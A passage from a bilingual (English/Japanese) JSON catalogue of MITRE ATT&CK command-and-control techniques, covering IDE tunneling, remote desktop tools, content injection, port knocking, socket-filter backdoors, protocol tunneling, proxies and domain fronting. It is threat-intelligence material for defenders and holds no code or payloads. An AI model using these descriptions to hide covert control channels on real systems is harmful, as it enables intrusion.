                        "description_eng": "An adversary may use legitimate remote access hardware to establish an interactive command and control channel to target systems within networks. These services, including IP-based keyboard, video, or mouse (KVM) devices such as TinyPilot and PiKVM, are commonly used as legitimate tools and may be allowed by peripheral device policies within a target environment.  \n\nRemote access hardware may be physically installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote session with the target system. Using hardware-based remote access tools may allow threat actors to bypass software security solutions and gain more control over the compromised device(s).(Citation: Palo Alto Unit 42 North Korean IT Workers 2024)(Citation: Google Cloud Threat Intelligence DPRK IT Workers 2024)",
                        "description_jp": "敵対者は、ネットワーク内のターゲットシステムへの対話型コマンド＆コントロールチャネルを確立するために、正当なリモートアクセスハードウェアを使用する可能性があります。TinyPilotやPiKVMなどのIPベースのキーボード、ビデオ、マウス（KVM）デバイスを含むこれらのサービスは、一般的に正当なツールとして使用され、ターゲット環境内の周辺機器ポリシーによって許可される場合があります。\n\nリモートアクセスハードウェアは、冗長アクセスのための代替通信チャネルとして、またはターゲットシステムとの対話型リモートセッションを確立する方法として、侵害後に物理的にインストールおよび使用される場合があります。ハードウェアベースのリモートアクセスツールを使用すると、脅威アクターはソフトウェアセキュリティソリューションをバイパスし、侵害されたデバイスに対するより多くの制御を得ることができる可能性があります。(引用: Palo Alto Unit 42 North Korean IT Workers 2024)(引用: Google Cloud Threat Intelligence DPRK IT Workers 2024)"
                    },
                    {
                        "id": "T1219.001",
                        "name_eng": "IDE Tunneling",
                        "name_jp": "IDEトンネリング",
                        "description_eng": "Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network. IDE tunneling combines SSH, port forwarding, file sharing, and debugging into a single secure connection, letting developers work on remote systems as if they were local. Unlike SSH and port forwarding, IDE tunneling encapsulates an entire session and may use proprietary tunneling protocols alongside SSH, allowing adversaries to blend in with legitimate development workflows. Some IDEs, like Visual Studio Code, also provide CLI tools (e.g., `code tunnel`) that adversaries may use to programmatically establish tunnels and generate web-accessible URLs for remote access. These tunnels can be authenticated through accounts such as GitHub, enabling the adversary to control the compromised system via a legitimate developer portal.(Citation: sentinelone operationDigitalEye Dec 2024)(Citation: Unit42 Chinese VSCode 06 September 2024)(Citation: Thornton tutorial VSCode shell September 2023)\n\nAdditionally, adversaries may use IDE tunneling for persistence. Some IDEs, such as Visual Studio Code and JetBrains, support automatic reconnection. Adversaries may configure the IDE to auto-launch at startup, re-establishing the tunnel upon execution. Compromised developer machines may also be exploited as jump hosts to move further into the network.\n\nIDE tunneling tools may be built-in or installed as [IDE Extensions](https://attack.mitre.org/techniques/T1176/002).",
                        "description_jp": "攻撃者は、統合開発環境（IDE）ソフトウェアのリモート開発機能を悪用して、ネットワーク内のターゲットシステム上にインタラクティブなコマンドアンドコントロールチャネルを確立する可能性があります。IDEトンネリングは、SSH、ポートフォワーディング、ファイル共有、デバッグを単一の安全な接続に組み合わせ、開発者がローカルシステムであるかのようにリモートシステムで作業できるようにします。SSHやポートフォワーディングとは異なり、IDEトンネリングはセッション全体をカプセル化し、SSHと共に独自のトンネリングプロトコルを使用する場合があり、これにより攻撃者は正当な開発ワークフローに紛れ込むことができます。Visual Studio Codeなどの一部のIDEは、攻撃者がプログラムでトンネルを確立し、リモートアクセス用のWebアクセス可能なURLを生成するために使用できるCLIツール（<code>code tunnel</code>など）も提供します。これらのトンネルは、GitHubなどのアカウントを介して認証でき、これにより攻撃者は正当な開発者ポータルを介して侵害されたシステムを制御できます。(引用: sentinelone operationDigitalEye Dec 2024)(引用: Unit42 Chinese VSCode 06 September 2024)(引用: Thornton tutorial VSCode shell September 2023)\n\nさらに、敵対者はIDEトンネリングを永続化のために使用する可能性があります。Visual Studio CodeやJetBrainsなどの一部のIDEは自動再接続をサポートしています。敵対者は、IDEを起動時に自動起動するように構成し、実行時にトンネルを再確立する可能性があります。侵害された開発者マシンはまた、ネットワークにさらに侵入するためのジャンプホストとして悪用される可能性があります。\n\nIDEトンネリングツールは、組み込みであるか、[IDE拡張機能](https://attack.mitre.org/techniques/T1176/002)としてインストールされている場合があります。"
                    },
                    {
                        "id": "T1219.002",
                        "name_eng": "Remote Desktop Software",
                        "name_jp": "リモートデスクトップソフトウェア",
                        "description_eng": "An adversary may use legitimate desktop support software to establish an interactive command and control channel to target systems within networks. Desktop support software provides a graphical interface for remotely controlling another computer, transmitting the display output, keyboard input, and mouse control between devices using various protocols. Desktop support software, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) \n \nRemote access modules/features may also exist as part of otherwise existing software such as Zoom or Google Chrome’s Remote Desktop.(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                        "description_jp": "敵対者は、正当なデスクトップサポートソフトウェアを使用して、ネットワーク内のターゲットシステムへの対話型コマンド＆コントロールチャネルを確立する可能性があります。デスクトップサポートソフトウェアは、様々なプロトコルを使用してデバイス間でディスプレイ出力、キーボード入力、マウス制御を送信することにより、別のコンピュータをリモートで制御するためのグラフィカルインターフェイスを提供します。<code>VNC</code>、<code>Team Viewer</code>、<code>AnyDesk</code>、<code>ScreenConnect</code>、<code>LogMein</code>、<code>AmmyyAdmin</code>、およびその他のリモート監視および管理（RMM）ツールなどのデスクトップサポートソフトウェアは、一般的に正当な技術サポートソフトウェアとして使用され、ターゲット環境内のアプリケーション制御によって許可される場合があります。(引用: Symantec Living off the Land)(引用: CrowdStrike 2015 Global Threat Report)(引用: CrySyS Blog TeamSpy)\n\nリモートアクセスモジュール/機能はまた、ZoomやGoogle Chromeのリモートデスクトップなど、他の既存のソフトウェアの一部として存在する場合があります。(引用：Google Chrome Remote Desktop)(引用：Chrome Remote Desktop)"
                    }
                ]
            },
            {
                "id": "T1659",
                "name_eng": "Content Injection",
                "name_jp": "コンテンツインジェクション",
                "description_eng": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "description_jp": "攻撃者は、オンラインネットワークトラフィックを介してシステムに悪意のあるコンテンツを注入することにより、被害者へのアクセスを取得し、継続的に通信する可能性があります。侵害されたウェブサイトでホストされている悪意のあるペイロードに被害者を誘導する（つまり、[ドライブバイターゲット](https://attack.mitre.org/techniques/T1608/004)の後に[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)）のではなく、攻撃者は最初に、トラフィックを操作したり独自のコンテンツを注入したりできる侵害されたデータ転送チャネルを介して被害者にアクセスする可能性があります。これらの侵害されたオンラインネットワークチャネルはまた、既に侵害されたシステムに追加のペイロード（つまり、[イングレスツール転送](https://attack.mitre.org/techniques/T1105)）やその他のデータを配信するためにも使用される場合があります。(引用: ESET MoustachedBouncer)\n\n敵対者は、次のような様々な方法で被害者システムにコンテンツを注入する可能性があります：\n\n* 中間から。攻撃者は正当なオンラインクライアントサーバー通信の間に位置します（**注:** これは、エンタープライズ環境内のみのAiTMアクティビティを記述する[中間者攻撃](https://attack.mitre.org/techniques/T1557)とは異なりますが、類似しています）(引用: Kaspersky Encyclopedia MiTM)\n* 横から。悪意のあるコンテンツが注入され、正当なオンラインサーバーの要求に対する偽の応答としてクライアントに競合します (引用: Kaspersky ManOnTheSide)\n\nコンテンツインジェクションは、多くの場合、侵害されたアップストリーム通信チャネルの結果であり、例えば、「合法的な傍受」の場合のように、インターネットサービスプロバイダー（ISP）のレベルで発生します。(引用: Kaspersky ManOnTheSide)(引用: ESET MoustachedBouncer)(引用: EFF China GitHub Attack)",
                "subtechniques": []
            },
            {
                "id": "T1205",
                "name_eng": "Traffic Signaling",
                "name_jp": "トラフィックシグナリング",
                "description_eng": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",
                "description_jp": "攻撃者は、永続化やコマンドアンドコントロールに使用されるオープンポートやその他の悪意のある機能を隠すために、トラフィックシグナリングを使用する可能性があります。トラフィックシグナリングには、クローズドポートを開いたり、悪意のあるタスクを実行したりするなど、特別な応答をトリガーするためにシステムに送信する必要があるマジックバリューまたはシーケンスの使用が含まれます。これは、攻撃者がコマンドアンドコントロールに使用できるポートが開かれる前に、特定の特性を持つ一連のパケットを送信するという形をとる場合があります。通常、この一連のパケットは、事前定義された一連のクローズドポートへの接続試行（つまり、[ポートノッキング](https://attack.mitre.org/techniques/T1205/001)）で構成されますが、異常なフラグ、特定の文字列、またはその他の固有の特性を含む場合もあります。シーケンスが完了した後、ポートを開くことはホストベースのファイアウォールによって達成される可能性がありますが、カスタムソフトウェアによって実装される可能性もあります。\n\n攻撃者はまた、既に開いているポートと通信する可能性がありますが、そのポートでリッスンしているサービスは、適切なマジックバリューが渡された場合にのみコマンドに応答したり、他の悪意のある機能をトリガーしたりします。\n\n通信をトリガーするためのシグナルパケットの監視は、さまざまな方法で行うことができます。Cd00r（引用: Hartrell cd00r 2002）によって最初に実装された1つの方法は、libpcapライブラリを使用して問題のパケットをスニッフィングすることです。別の方法は、マルウェアが他のプログラムによって既に使用されているポートを使用できるようにするローソケットを利用します。\n\nネットワークデバイスでは、攻撃者は細工されたパケットを使用して、telnetなど、デバイスが提供する標準サービスの[ネットワークデバイス認証](https://attack.mitre.org/techniques/T1556/004)を有効にする可能性があります。このようなシグナリングは、telnetなどのクローズドサービスポートを開いたり、デバイス上のマルウェアインプラントのモジュール変更をトリガーして、悪意のある機能を追加、削除、または変更したりするためにも使用される場合があります。攻撃者は、細工されたパケットを使用して1つ以上の（オープンまたはクローズド）ポートに接続しようとする可能性がありますが、目標を達成するために同じポートでルーターインターフェイス、ブロードキャスト、およびネットワークアドレスIPに接続しようとする可能性もあります。(引用: Cisco Synful Knock Evolution)(引用: Mandiant - Synful Knock)(引用: Cisco Blog Legacy Device Attacks) 組込みデバイスでこのトラフィックシグナリングを有効にするには、アーキテクチャのモノリシックな性質のため、攻撃者はまず[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を達成して利用する必要があります。\n\n攻撃者はまた、Wake-on-LAN機能を使用して電源がオフになっているシステムをオンにする可能性があります。Wake-on-LANは、電源がオフになっているシステムにマジックパケットを送信することで電源をオンにしたり、起動したりできるハードウェア機能です。システムがオンになると、横方向の移動のターゲットになる可能性があります。(引用: Bleeping Computer - Ryuk WoL)(引用: AMD Magic Packet)",
                "subtechniques": [
                    {
                        "id": "T1205.001",
                        "name_eng": "Port Knocking",
                        "name_jp": "ポートノッキング",
                        "description_eng": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
                        "description_jp": "攻撃者は、永続化やコマンドアンドコントロールに使用されるオープンポートを隠すためにポートノッキングを使用する可能性があります。ポートを有効にするために、攻撃者は事前定義された一連のクローズドポートへの一連の接続試行を送信します。シーケンスが完了した後、ポートを開くことはホストベースのファイアウォールによって行われることが多いですが、カスタムソフトウェアによって実装される可能性もあります。\n\nこのテクニックは、リスニングポートの動的なオープンと、別のシステム上のリスニングサーバーへの接続の開始の両方で観察されています。\n\n通信をトリガーするためのシグナルパケットの監視は、さまざまな方法で行うことができます。Cd00r（引用: Hartrell cd00r 2002）によって最初に実装された1つの方法は、libpcapライブラリを使用して問題のパケットをスニッフィングすることです。別の方法は、マルウェアが他のプログラムによって既に使用されているポートを使用できるようにするローソケットを利用します。"
                    },
                    {
                        "id": "T1205.002",
                        "name_eng": "Socket Filters",
                        "name_jp": "ソケットフィルター",
                        "description_eng": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                        "description_jp": "攻撃者は、永続化やコマンドアンドコントロールに使用されるバックドアを監視してからアクティブ化するために、ネットワークソケットにフィルターをアタッチする可能性があります。昇格された権限を持つ攻撃者は、<code>libpcap</code>ライブラリなどの機能を使用してソケットを開き、特定の種類のデータがソケットを通過することを許可または不許可にするフィルターをインストールできます。フィルターは、指定されたネットワークインターフェイス（または指定されていない場合はすべてのインターフェイス）を通過するすべてのトラフィックに適用される場合があります。ネットワークインターフェイスがフィルター条件に一致するパケットを受信すると、リバースシェルのアクティブ化など、ホストで追加のアクションをトリガーできます。\n\n接続を確立するために、攻撃者はインストールされたフィルター条件に一致する細工されたパケットをターゲットホストに送信します。(引用: haking9 libpcap network sniffing) 攻撃者はこれらのソケットフィルターを使用して、インプラントのインストールをトリガーしたり、ピングバックを実行したり、コマンドシェルを呼び出したりしています。これらのソケットフィルターとの通信は、[プロトコルトンネリング](https://attack.mitre.org/techniques/T1572)と組み合わせて使用される場合もあります。(引用: exatrack bpf filters passive backdoors)(引用: Leonardo Turla Penquin May 2020)\n\nフィルターは、<code>libpcap</code>がインストールされているUnixライクなプラットフォーム、または<code>Winpcap</code>を使用しているWindowsホストにインストールできます。攻撃者は、<code>libpcap</code>と<code>pcap_setfilter</code>を使用するか、標準ライブラリ関数<code>setsockopt</code>と<code>SO_ATTACH_FILTER</code>オプションを使用する場合があります。パケットが受信されるまでソケット接続はアクティブではないため、ホストでのアクティビティの欠如、低いCPUオーバーヘッド、およびローソケット使用状況への限定的な可視性により、この動作を検出することは困難な場合があります。"
                    }
                ]
            },
            {
                "id": "T1572",
                "name_eng": "Protocol Tunneling",
                "name_jp": "プロトコルトンネリング",
                "description_eng": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling)(Citation: Sygnia Abyss Locker 2025) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure.",
                "description_jp": "攻撃者は、検出/ネットワークフィルタリングを回避したり、他の方法では到達できないシステムへのアクセスを可能にしたりするために、被害者システムとの間でネットワーク通信を別のプロトコル内でトンネリングする可能性があります。トンネリングには、プロトコルを別のプロトコル内に明示的にカプセル化することが含まれます。この動作は、既存のトラフィックと混同することにより悪意のあるトラフィックを隠蔽したり、暗号化の外部レイヤーを提供したり（VPNと同様）する可能性があります。トンネリングはまた、ネットワークアプライアンスによってフィルタリングされたり、インターネット経由でルーティングされなかったりするSMB、RDP、またはその他のトラフィックなど、通常は意図した宛先に到達しないネットワークパケットのルーティングを可能にする場合もあります。\n\nプロトコルを別のプロトコルにカプセル化するには、様々な手段があります。例えば、攻撃者はSSHトンネリング（SSHポートフォワーディングとも呼ばれる）を実行する可能性があり、これには暗号化されたSSHトンネルを介して任意のデータを転送することが含まれます。(引用: SSH Tunneling)(引用: Sygnia Abyss Locker 2025)\n\n[プロトコルトンネリング](https://attack.mitre.org/techniques/T1572)はまた、[動的解決](https://attack.mitre.org/techniques/T1568)中に攻撃者によって悪用される可能性があります。DNS over HTTPS (DoH)として知られており、C2インフラストラクチャを解決するためのクエリは、暗号化されたHTTPSパケット内にカプセル化される場合があります。(引用: BleepingComp Godlua JUL19)\n\n敵対者はまた、C2通信とインフラストラクチャをさらに隠蔽するために、[プロキシ](https://attack.mitre.org/techniques/T1090)および/または[プロトコルまたはサービスの偽装](https://attack.mitre.org/techniques/T1001/003)と組み合わせて[プロトコルトンネリング](https://attack.mitre.org/techniques/T1572)を利用するかもしれない。",
                "subtechniques": []
            },
            {
                "id": "T1092",
                "name_eng": "Communication Through Removable Media",
                "name_jp": "リムーバブルメディア経由の通信",
                "description_eng": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.(Citation: ESET Sednit USBStealer 2014) Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
                "description_jp": "攻撃者は、システム間でコマンドを転送するためにリムーバブルメディアを使用して、潜在的に切断されたネットワーク上の侵害されたホスト間でコマンドアンドコントロールを実行できます。(引用: ESET Sednit USBStealer 2014) 両方のシステムが侵害されている必要があり、インターネットに接続されたシステムが最初に侵害され、2番目のシステムは[リムーバブルメディアによる複製](https://attack.mitre.org/techniques/T1091)による横方向の移動によって侵害された可能性が高いです。コマンドとファイルは、切断されたシステムから、攻撃者が直接アクセスできるインターネット接続システムに中継されます。",
                "subtechniques": []
            },
            {
                "id": "T1090",
                "name_eng": "Proxy",
                "name_jp": "プロキシ",
                "description_eng": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
                "description_jp": "攻撃者は、システム間のネットワークトラフィックを指示したり、コマンドアンドコントロールサーバーへのネットワーク通信の中継役として機能したりするために接続プロキシを使用し、インフラストラクチャへの直接接続を回避する可能性があります。[HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy、ZXPortMapなど、プロキシやポートリダイレクトを介したトラフィックリダイレクトを可能にする多くのツールが存在します。(引用: Trend Micro APT Attack Tools) 攻撃者はこれらの種類のプロキシを使用して、コマンドアンドコントロール通信を管理したり、同時アウトバウンドネットワーク接続の数を減らしたり、接続損失に直面した場合の回復力を提供したり、被害者間の既存の信頼できる通信パスに乗って疑いを回避したりします。攻撃者は複数のプロキシを連鎖させて、悪意のあるトラフィックの送信元をさらに偽装する可能性があります。\n\n敵対者はまた、コマンド＆コントロールトラフィックをプロキシするために、コンテンツ配信ネットワーク（CDN）のルーティングスキームを利用することもできます。",
                "subtechniques": [
                    {
                        "id": "T1090.001",
                        "name_eng": "Internal Proxy",
                        "name_jp": "内部プロキシ",
                        "description_eng": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
                        "description_jp": "攻撃者は、侵害された環境内の2つ以上のシステム間でコマンドアンドコントロールトラフィックを指示するために内部プロキシを使用する可能性があります。[HTRAN](https://attack.mitre.org/software/S0040)、ZXProxy、ZXPortMapなど、プロキシまたはポートリダイレクトを介したトラフィックリダイレクトを可能にする多くのツールが存在します。(引用: Trend Micro APT Attack Tools) 攻撃者は内部プロキシを使用して、侵害された環境内でコマンドアンドコントロール通信を管理したり、同時アウトバウンドネットワーク接続の数を減らしたり、接続損失に直面した場合の回復力を提供したり、感染したシステム間の既存の信頼できる通信パスに乗って疑いを回避したりします。内部プロキシ接続は、SMBなどの一般的なピアツーピア（p2p）ネットワークプロトコルを使用して、環境によりよく溶け込む場合があります。\n\n侵害された内部システムをプロキシとして使用することにより、攻撃者はC2トラフィックの真の宛先を隠蔽し、外部システムへの多数の接続の必要性を減らすことができます。"
                    },
                    {
                        "id": "T1090.003",
                        "name_eng": "Multi-hop Proxy",
                        "name_jp": "マルチホッププロキシ",
                        "description_eng": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n\nFor example, adversaries may construct or use onion routing networks – such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network – to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing) Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations.(Citation: ORB Mandiant) \n\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.  \n\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan)",
                        "description_jp": "攻撃者は複数のプロキシを連鎖させて、悪意のあるトラフィックの送信元を偽装する可能性があります。通常、防御側はネットワークに入る前にトラフィックが通過した最後のプロキシを特定できます。防御側は、最終ホッププロキシの前の以前のプロキシを特定できる場合とできない場合があります。このテクニックは、防御側が悪意のあるトラフィックをいくつかのプロキシを介して追跡して送信元を特定する必要があるため、悪意のあるトラフィックの元の送信元を特定することをさらに困難にします。\n\n例えば、攻撃者は、一般に公開されている[Tor](https://attack.mitre.org/software/S0183)ネットワークなどのオニオンルーティングネットワークを構築または使用して、侵害された集団を介して暗号化されたC2トラフィックを転送し、ネットワーク内の任意のデバイスとの通信を可能にする可能性があります。(引用: Onion Routing) 攻撃者はまた、仮想プライベートサーバー（VPS）、モノのインターネット（IoT）デバイス、スマートデバイス、およびサポート終了ルーターで構成される運用リレーボックス（ORB）ネットワークを使用して、操作を難読化する可能性もあります。(引用: ORB Mandiant)\n\nネットワークインフラの場合、攻撃者は複数の侵害されたデバイスを利用してマルチホッププロキシチェーンを作成する（つまり、[ネットワークデバイス](https://attack.mitre.org/techniques/T1584/008)）可能性があります。ルーター上の[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を利用することにより、攻撃者は影響を受けるネットワークデバイスにカスタムコードを追加して、それらのノード間でオニオンルーティングを実装できます。この方法は、攻撃者がインターネット境界の保護されたネットワーク境界を越えて組織の広域ネットワーク（WAN）に侵入できるようにする[ネットワーク境界ブリッジング](https://attack.mitre.org/techniques/T1599)方法に依存します。ICMPなどのプロトコルがトランスポートとして使用される場合があります。\n\n同様に、攻撃者はピアツーピア（P2P）およびブロックチェーン指向のインフラストラクチャを悪用して、分散型ピアネットワーク間のルーティングを実装する可能性があります。(引用: NGLite Trojan)"
                    },
                    {
                        "id": "T1090.004",
                        "name_eng": "Domain Fronting",
                        "name_jp": "ドメインフロンティング",
                        "description_eng": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
                        "description_jp": "攻撃者は、コンテンツ配信ネットワーク（CDN）や複数のドメインをホストするその他のサービスのルーティングスキームを利用して、HTTPSトラフィックまたはHTTPS経由でトンネリングされたトラフィックの意図した宛先を難読化する可能性があります。(引用: Fifield Blocking Resistent Communication through domain fronting 2015) ドメインフロンティングには、TLSヘッダーのSNIフィールドとHTTPヘッダーのHostフィールドに異なるドメイン名を使用することが含まれます。両方のドメインが同じCDNから提供されている場合、CDNはTLSヘッダーをアンラップした後、HTTPヘッダーで指定されたアドレスにルーティングする可能性があります。このテクニックのバリエーションである「ドメインレス」フロンティングでは、SNIフィールドが空白のままになります。これにより、CDNがSNIフィールドとHTTP Hostフィールドが一致することを検証しようとしても（空白のSNIフィールドが無視される場合）、フロンティングが機能する可能性があります。\n\n例えば、ドメインxとドメインyが同じCDNの顧客である場合、TLSヘッダーにドメインxを、HTTPヘッダーにドメインyを配置することが可能です。トラフィックはドメインxに向かっているように見えますが、CDNはそれをドメインyにルーティングする可能性があります。"
                    },
                    {
                        "id": "T1090.002",
                        "name_eng": "External Proxy",
                        "name_jp": "外部プロキシ",
